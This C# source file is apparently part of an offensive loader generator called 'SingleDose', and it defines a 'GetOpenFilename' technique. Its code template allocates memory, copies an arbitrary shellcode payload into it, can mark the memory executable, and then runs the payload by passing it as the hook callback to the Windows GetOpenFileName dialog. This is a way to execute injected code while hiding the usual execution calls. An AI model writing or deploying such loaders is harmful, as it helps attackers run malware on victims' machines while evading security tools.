using System.Collections.Generic;

namespace SingleDose.Techniques.Loaders
{
    internal class GetOpenFilename : ITechnique
    {
        string ITechnique.TechniqueName => "GetOpenFilename";

        string ITechnique.TechniqueDescription => null;

        List<string> ITechnique.TechniqueReferences => new List<string>() {
            @"https://gist.github.com/Wra7h/955c71ecd91af959ec24a61244834cc7"
        };

        bool ITechnique.IsUnsafe => false;

        bool ITechnique.IsLoader => true;
        
        List<string> ITechnique.Invokes => new List<string>() { "VirtualAlloc", "GetOpenFileName" };
        
        List<string> ITechnique.Prerequisites => null;
        
        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        public static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            {{PROTECT}}
            int OFN_ENABLEHOOK = 0x00000020;
            int OFN_EXPLORER = 0x00080000;
            OpenFileName sOpenFileName = new OpenFileName();
            sOpenFileName.lStructSize = Marshal.SizeOf(sOpenFileName);
            sOpenFileName.nMaxFile = 256;
            sOpenFileName.Flags = OFN_ENABLEHOOK | OFN_EXPLORER;
            sOpenFileName.lpfnHook = hAlloc;
            GetOpenFileName(sOpenFileName);
        }
        {{ARGS}}
        {{INVOKE}}
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct OpenFileName
        {
            public int lStructSize;
            public IntPtr hwndOwner;
            public IntPtr hInstance;
            public string lpstrFilter;
            public string lpstrCustomFilter;
            public int nMaxCustFilter;
            public int nFilterIndex;
            public string lpstrFile;
            public int nMaxFile;
            public string lpstrFileTitle;
            public int nMaxFileTitle;
            public string lpstrInitialDir;
            public string lpstrTitle;
            public int Flags;
            public short nFileOffset;
            public short nFileExtension;
            public string lpstrDefExt;
            public IntPtr lCustData;
            public IntPtr lpfnHook;
            public string lpTemplateName;
            public IntPtr pvReserved;
            public int dwReserved;
            public int flagsEx;
        }
    }
}";

        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect);";
    }
}
